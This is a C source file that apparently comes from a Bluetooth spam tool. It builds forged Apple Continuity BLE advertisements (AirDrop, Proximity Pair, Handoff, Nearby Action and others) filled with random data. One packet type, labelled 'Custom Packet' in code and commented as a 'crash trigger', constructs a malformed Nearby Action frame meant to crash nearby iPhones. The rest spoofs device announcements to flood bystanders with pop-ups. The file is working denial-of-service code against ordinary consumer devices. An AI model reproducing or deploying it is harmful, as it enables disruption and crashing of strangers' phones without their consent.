#include "continuity.h"
#include <stdint.h>
#include <stdlib.h>

#ifndef COUNT_OF
#define COUNT_OF(x) (sizeof(x) / sizeof((x)[0]))
#endif

static const char* continuity_type_names[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = "AirDrop",
    [ContinuityTypeProximityPair] = "Proximity Pair",
    [ContinuityTypeAirplayTarget] = "Airplay Target",
    [ContinuityTypeHandoff] = "Handoff",
    [ContinuityTypeTetheringSource] = "Tethering Source",
    [ContinuityTypeNearbyAction] = "Nearby Action",
    [ContinuityTypeNearbyInfo] = "Nearby Info",
    [ContinuityTypeCustomCrash] = "Custom Packet",
};

const char* continuity_get_type_name(ContinuityType type) {
    return continuity_type_names[type];
}

#define HEADER_LEN (6)
static uint8_t continuity_packet_sizes[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = HEADER_LEN + 18,
    [ContinuityTypeProximityPair] = HEADER_LEN + 25,
    [ContinuityTypeAirplayTarget] = HEADER_LEN + 6,
    [ContinuityTypeHandoff] = HEADER_LEN + 14,
    [ContinuityTypeTetheringSource] = HEADER_LEN + 6,
    [ContinuityTypeNearbyAction] = HEADER_LEN + 5,
    [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
    [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
};

uint8_t continuity_get_packet_size(ContinuityType type) {
    return continuity_packet_sizes[type];
}

void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
    uint8_t size = continuity_get_packet_size(msg->type);
    uint8_t i = 0;

    packet[i++] = size - 1;
    packet[i++] = 0xFF;
    packet[i++] = 0x4C;
    packet[i++] = 0x00;
    packet[i++] = msg->type;
    packet[i] = size - i - 1;
    i++;

    switch(msg->type) {
    case ContinuityTypeAirDrop:
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x01;
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = 0x00;
        break;

    case ContinuityTypeProximityPair:
        packet[i++] = msg->data.proximity_pair.prefix;
        packet[i++] = msg->data.proximity_pair.model >> 8;
        packet[i++] = msg->data.proximity_pair.model & 0xFF;
        packet[i++] = 0x55;
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10);
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10);
        packet[i++] = (rand() % 256);
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        for (uint8_t j = 0; j < 16; j++) {
            packet[i++] = rand() % 256;
        }
        break;

    case ContinuityTypeAirplayTarget:
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        break;

    case ContinuityTypeHandoff:
        packet[i++] = 0x01;
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        break;

    case ContinuityTypeTetheringSource:
        packet[i++] = 0x01;
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 101);
        packet[i++] = 0x00;
        packet[i++] = (rand() % 8);
        packet[i++] = (rand() % 5);
        break;

    case ContinuityTypeNearbyAction:
        packet[i] = msg->data.nearby_action.flags;
        if(packet[i] == 0xBF && rand() % 2) packet[i]++;
        i++;
        packet[i++] = msg->data.nearby_action.type;
        for (uint8_t j = 0; j < 3; j++) {
            packet[i++] = rand() % 256;
        }
        break;

    case ContinuityTypeNearbyInfo:
        packet[i++] = ((rand() % 16) << 4) + (rand() % 16);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        packet[i++] = (rand() % 256);
        break;

    case ContinuityTypeCustomCrash:
        i -= 2;
        packet[i++] = ContinuityTypeNearbyAction; // 0x09
        packet[i++] = 0x05; // Length of Nearby Action segment
        packet[i++] = 0xC1; // Action Flags (crash trigger)
        const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
        packet[i++] = types[rand() % COUNT_OF(types)];
        for (uint8_t j = 0; j < 3; j++) {
            packet[i++] = rand() % 256;
        }
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = ContinuityTypeNearbyInfo; // 0x0A
        packet[i++] = 0x03; // Length of Nearby Info segment
        for (uint8_t j = 0; j < 3; j++) {
            packet[i++] = rand() % 256;
        }
        break;

    default:
        break;
    }
}